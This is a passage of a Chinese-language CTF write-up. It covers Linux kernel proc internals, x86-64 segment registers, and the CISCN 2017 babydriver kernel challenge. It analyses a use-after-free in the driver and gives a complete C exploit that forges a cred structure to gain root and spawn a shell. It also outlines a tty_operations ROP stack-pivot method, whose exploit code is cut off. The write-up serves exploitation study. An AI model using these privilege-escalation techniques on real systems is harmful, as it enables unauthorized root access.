class="title">pde_unload_completion</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span> *<span class="title">proc_iops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> *<span class="title">proc_ops</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_dir_ops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">dentry_operations</span> *<span class="title">proc_dops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">seq_ops</span>;</span></span><br><span class="line"><span class="type">int</span> (*single_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">proc_write_t</span> write;</span><br><span class="line"><span class="type">void</span> *data;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> state_size;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> low_ino;</span><br><span class="line"><span class="type">nlink_t</span> nlink;</span><br><span class="line"><span class="type">kuid_t</span> uid;</span><br><span class="line"><span class="type">kgid_t</span> gid;</span><br><span class="line"><span class="type">loff_t</span> size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">parent</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span> <span class="title">subdir</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">subdir_node</span>;</span></span><br><span class="line"><span class="type">char</span> *name;</span><br><span class="line"><span class="type">umode_t</span> mode;</span><br><span class="line">u8 flags;</span><br><span class="line">u8 namelen;</span><br><span class="line"><span class="type">char</span> inline_name[];</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><hr><p>继续跟进<code>proc_create_data</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_create_data</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">umode_t</span> mode,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> proc_dir_entry *parent,</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="keyword">struct</span> proc_ops *proc_ops, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">p = proc_create_reg(name, mode, &amp;parent, data);</span><br><span class="line"><span class="keyword">if</span> (!p)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">p-&gt;proc_ops = proc_ops;</span><br><span class="line">pde_set_flags(p);</span><br><span class="line"><span class="keyword">return</span> proc_register(parent, p);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(proc_create_data);</span><br></pre></td></tr></table></figure><p>其中<code>proc_create_reg</code>的主要功能是创建并返回一个<code>proc_dir_entry</code>结构体指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_create_reg</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">umode_t</span> mode,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> proc_dir_entry **parent, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((mode &amp; S_IFMT) == <span class="number">0</span>)</span><br><span class="line">mode |= S_IFREG;</span><br><span class="line"><span class="keyword">if</span> ((mode &amp; S_IALLUGO) == <span class="number">0</span>)</span><br><span class="line">mode |= S_IRUGO;</span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(!S_ISREG(mode)))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">p = __proc_create(parent, name, mode, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (p) &#123;</span><br><span class="line">p-&gt;proc_iops = &amp;proc_file_inode_operations;</span><br><span class="line">p-&gt;data = data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后设置p-&gt;proc_ops = proc_ops;相当于完成注册函数</p><p>再返回函数proc_register进行注册</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* returns the registered entry, or frees dp and returns NULL on failure */</span></span><br><span class="line"><span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_register</span><span class="params">(<span class="keyword">struct</span> proc_dir_entry *dir,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> proc_dir_entry *dp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (proc_alloc_inum(&amp;dp-&gt;low_ino))</span><br><span class="line"><span class="keyword">goto</span> out_free_entry;</span><br><span class="line"></span><br><span class="line">write_lock(&amp;proc_subdir_lock);</span><br><span class="line">dp-&gt;parent = dir;</span><br><span class="line"><span class="keyword">if</span> (pde_subdir_insert(dir, dp) == <span class="literal">false</span>) &#123;</span><br><span class="line">WARN(<span class="number">1</span>, <span class="string">&quot;proc_dir_entry &#x27;%s/%s&#x27; already registered\n&quot;</span>,</span><br><span class="line">     dir-&gt;name, dp-&gt;name);</span><br><span class="line">write_unlock(&amp;proc_subdir_lock);</span><br><span class="line"><span class="keyword">goto</span> out_free_inum;</span><br><span class="line">&#125;</span><br><span class="line">dir-&gt;nlink++;</span><br><span class="line">write_unlock(&amp;proc_subdir_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> dp;</span><br><span class="line">out_free_inum:</span><br><span class="line">proc_free_inum(dp-&gt;low_ino);</span><br><span class="line">out_free_entry:</span><br><span class="line">pde_free(dp);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更细的暂且不做分析</p><h2 id="延拓2"><a href="#延拓2" class="headerlink" title="延拓2"></a>延拓2</h2><p>​    Intel处理器实现了6个段寄存器，用来方便程序设计者对程序的代码、数据和栈进行分段和引用.</p><p>通常来说</p><ol><li>代码段用cs寄存器来分段和引用</li><li>数据段用ds寄存器来分段和引用</li><li>栈段用ss寄存器来分段和引用</li><li>另外3个段寄存器es、fs和gs可以用来分段和引用额外的数据段。</li></ol><p>​    在程序执行代码段里的代码、或访问数据段中的数据之前，需要事先将合法的16位段选择符的值加载到适当的段寄存器中，否则无法执行代码或访问数据。因此，虽然一个程序可以有很多段，但是某一时刻最多可以同时使用的只有其中的6个。要引用其他段，就要先加载对应的段选择符到适当的段寄存器中。</p><p>​    每个段寄存器都包含两个部分：对开发者可见的部分和不可见的隐藏部分。每当向一个段寄存器中加载段选择符的时候，处理器会自动将段选择符指向的段描述符中的基地址、限长和一些属性信息加载到段寄存器中的隐藏部分。</p><p>​    如果系统软件对某个段描述符进行了修改，那么系统软件也有责任重新加载对应的段寄存器，以确保对段描述符所做的修改能够生效（尤其是隐藏部分）。如果系统软件不重载段寄存器，那么缓存在段寄存器中隐藏部分的旧信息还会被继续使用。但从另一个角度来讲，只要不重载段寄存器，段寄存器的隐藏部分的内容就不会发生变化，在进行处理器模式切换的时候，比如从实模式切换到保护模式时之所以能够顺利执行，也是得益于这一原理。</p><h3 id="x86-64处理器模式下的段寄存器"><a href="#x86-64处理器模式下的段寄存器" class="headerlink" title="x86-64处理器模式下的段寄存器"></a>x86-64处理器模式下的段寄存器</h3><p>​    Intel理解到了现代操作系统设计者的想法，于是在x86-64处理器模式中，在微架构层将分段单元中的绝大多数功能都绕开了（注意不是关闭了分段单元）。</p><p>​    具体来说，在加载cs、ds、es和ss寄存器时，对应的段描述符中的基地址，限长和部分属性字段一概被忽略，并假设基地址总为0，限长总为2^64-1。同样在使用ds、es和ss段前缀的时候，也都做出同样的假设；同时，这些段寄存器中隐藏部分中与上述对应的字段也被忽略。因此x86-64处理器模式只支持平坦内存模型，即从0开始到2^48-1结束的规范化的虚拟地址空间，这是x86-64处理器模式中所做的硬性规定，因为这些规定可以进一步加快逻辑地址到虚拟地址的转换效率。</p><h3 id="x86-64处理器模式下的fs-gs段寄存器"><a href="#x86-64处理器模式下的fs-gs段寄存器" class="headerlink" title="x86-64处理器模式下的fs/gs段寄存器"></a>x86-64处理器模式下的fs/gs段寄存器</h3><p>​    虽说分段单元在x86-64处理器模式中绝大多数的情况下都被绕过了，但少数情况下不会绕过，就比如fs和gs段寄存器</p><p>​    但是64位处理器模式下的分段单元的微架构逻辑还是有些新的“猫腻”，具体做法是：获取fs和gs寄存器中隐藏部分的x86-64基地址（后文简写为fs.base和gs.base）的方式不再是通过fs和gs寄存器所指向的GDT/IDT中的段描述符来指定，而是在物理上就将fs和gs寄存器中隐藏部分中的64位基地址直接在物理上映射到了IA32_FS_BASE MSR（复位值为0）和IA32_GS_BASE MSR（复位值为0）这两个MSR上（或者说IA32_FS_BASE MSR和IA32_GS_BASE MSR分别是fs.base和gs.base的别名）。系统软件可以事先对这两个MSR进行编程，以便软件能够用fs和gs寄存器对特殊的数据进行引用。</p><p>具体来说，现代Linux x86-64下的fs/gs段寄存器的用途分别为：</p><ul><li><strong>用户态使用fs寄存器引用线程的glibc TLS和线程在用户态的stack canary；用户态的glibc不使用gs寄存器；应用可以自行决定是否使用该寄存器</strong></li><li><strong>内核态使用gs寄存器引用percpu变量和进程在内核态的stack canary；内核态不使用fs寄存器。</strong></li></ul><h2 id="模块地址获取"><a href="#模块地址获取" class="headerlink" title="模块地址获取"></a>模块地址获取</h2><ul><li>cat /proc/modules </li><li>cat /proc/devices </li><li>cat /proc/kallsyms </li><li>lsmod </li><li>dmesg</li></ul><h1 id="CISCN-2017-babydriver"><a href="#CISCN-2017-babydriver" class="headerlink" title="CISCN 2017 babydriver"></a>CISCN 2017 babydriver</h1><h2 id="文件分析-1"><a href="#文件分析-1" class="headerlink" title="文件分析"></a>文件分析</h2><p>看一下boot.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   │ File: ../boot.sh</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ #!/bin/bash</span><br><span class="line">   2   │ </span><br><span class="line">   3   │ qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev</span><br><span class="line">       │ /ram oops=panic panic=1&#x27; -enable-kvm -monitor /dev/null -m 256M --nographic  -smp cores</span><br><span class="line">       │ =1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure><p>看到开启了smep保护</p><p>再看init</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">       │ File: init</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ #!/bin/sh</span><br><span class="line">   2   │  </span><br><span class="line">   3   │ mount -t proc none /proc</span><br><span class="line">   4   │ mount -t sysfs none /sys</span><br><span class="line">   5   │ mount -t devtmpfs devtmpfs /dev</span><br><span class="line">   6   │ chown root:root flag</span><br><span class="line">   7   │ chmod 400 flag</span><br><span class="line">   8   │ exec 0&lt;/dev/console</span><br><span class="line">   9   │ exec 1&gt;/dev/console</span><br><span class="line">  10   │ exec 2&gt;/dev/console</span><br><span class="line">  11   │ </span><br><span class="line">  12   │ insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">  13   │ chmod 777 /dev/babydev</span><br><span class="line">  14   │ echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">  15   │ setsid cttyhack setuidgid 1000 sh</span><br><span class="line">  16   │ </span><br><span class="line">  17   │ umount /proc</span><br><span class="line">  18   │ umount /sys</span><br><span class="line">  19   │ poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>其中insmod加载了babydriver.ko驱动</p><h2 id="模块分析-1"><a href="#模块分析-1" class="headerlink" title="模块分析"></a>模块分析</h2><p>checksec</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/babydriver/babydriver.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>几乎没有保护</p><p>根据fops结构体可以知道驱动提供的外部接口对应如下</p><ul><li>open =&gt; babyopen</li><li>read =&gt; babyread</li><li>write =&gt; babywrite</li><li>ioctl =&gt; babyioctl</li><li>free =&gt; babyrelease</li></ul><p><strong>babyioctl:</strong> 定义了 0x10001 的命令，可以释放全局变量 babydev_struct 中的 device_buf，再根据用户传递的 size 重新申请一块内存，并设置 device_buf_len。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;\x013defalut:arg is %ld\n&quot;</span>, v3, v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>babyopen:</strong> 申请一块空间，大小为 0x40 字节，地址存储在全局变量 babydev_struct.device_buf 上，并更新 babydev_struct.device_buf_len</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="type">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">0x40</span>LL);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">0x24000C0</span>LL, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>babyread:</strong> 先检查长度是否小于 babydev_struct.device_buf_len，然后把 babydev_struct.device_buf 中的数据拷贝到 buffer 中，buffer 和长度都是用户传递的参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">      copy_to_user(buffer, babydev_struct.device_buf, v4);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>babywrite:</strong> 类似 babyread，不同的是从 buffer 拷贝到全局变量中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">      copy_from_user(babydev_struct.device_buf, buffer, v4);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>babyrelease:</strong> 释放空间，没什么好说的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="细节问题"><a href="#细节问题" class="headerlink" title="细节问题"></a>细节问题</h3><p>本题fops结构体,ida显示并未注册babyrelease函数,但真正做题的时候发现是注册了的</p><p>一开始很困惑,以为是什么特殊的机制,最后发现babyrelease的函数位置就是0</p><p>也就是说本来是注册了的,但是因为值刚好是0,ida看不出来,才显示未注册</p><p>并且更进一步可以得到,所有未注册的函数最终都默认注册babyrelease因为未注册就显示NULL,而babyrelease就是null(0)</p><p>不过也仅限这题了</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>观察到babyrelease函数只是free,并没有置零且存储chunk的指针是全局变量</p><p>如果我们同时打开两个babydev设备文件</p><p>并将其中一个释放那么就可以uaf了,那如何利用这个uaf</p><h3 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a><strong>思路1</strong></h3><p><strong>此种方法在较新版本 kernel 中已不可行，我们已无法直接分配到 cred_jar 中的 object</strong>，这是因为 cred_jar 在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在 <code>CONFIG_MEMCG_KMEM=y</code> 时（默认开启）<strong>cred_jar 不会再与相同大小的 kmalloc-192 进行合并</strong></p><p>但在本题版本可以分配到刚才释放的chunk</p><p>因此可以伪造cred结构体,修改权限</p><p>并fork一个程序</p><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> device1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> device2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">ioctl(device1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line">close(device1);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> new_process_pid = fork();</span><br><span class="line"><span class="keyword">if</span> (new_process_pid &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] fork error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (new_process_pid == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> lots_zero[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">write(device2, lots_zero, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] got root&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">wait(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">close(device2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h3><p>同样是利用uaf</p><p>不过这次利用的是在 <code>/dev</code> 下有一个伪终端设备 <code>ptmx</code> ，在我们打开这个设备时内核中会创建一个 <code>tty_struct</code> 结构体，与其他类型设备相同，tty 驱动设备中同样存在着一个存放着函数指针的结构体 <code>tty_operations</code>。</p><p>tty_struct的size是0x2e0</p><p>利用uaf我们可以劫持其中的tty_operations函数指针</p><p>那么在我们对这个设备进行相应操作（如 write、ioctl）时便会执行我们布置好的恶意函数指针。</p><p>由于没有开启 SMAP 保护，故我们可以在用户态进程的栈上布置 ROP 链与 <code>fake tty_operations</code> 结构体。</p><p>使用 gdb 进行调试，观察内核在调用我们的恶意函数指针时各寄存器的值，我们在这里选择劫持 <code>tty_operaionts</code> 结构体到用户态的栈上，并选择任意一条内核 gadget 作为 fake tty 函数指针以方便下断点：</p><p>这段调试可能有点难理解,即劫持tty_ops的函数表为内核上的任意可区分代码,这样我们在调试时可以在对应的位置下断点,以观察当前的上下文环境</p><p>我们不难观察到，在我们调用<code>tty_operations-&gt;write</code>时，<strong>其 rax 寄存器中存放的便是 tty_operations 结构体的地址</strong>，因此若是我们能够在内核中找到形如<code>mov rsp, rax</code>的 gadget，便能够成功地将栈迁移到<code>tty_operations</code>结构体的开头。</p><p>使用 ROPgadget 查找相关 gadget，发现有两条符合我们要求的 gadget：</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/figure/ttygadget.png" alt="image.png"></p><p>gdb 调试，发现第一条 gadget 其实等价于<code>mov rsp, rax ; dec ebx ; ret</code>：</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/figure/ttygadget2.png" alt="image.png"></p><p>那么利用这条 gadget 我们便可以很好地完成栈迁移的过程，执行我们所构造的 ROP 链。</p><p>而<code>tty_operations</code>结构体开头到其 write 指针间的空间较小,直接在此处rop显然是行不通的(与write指针冲突)，因此我们还需要进行二次栈迁移，这里随便选一条改 rax 的 gadget 即可：</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/figure/ttygadget3.png" alt="image.png"></p><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 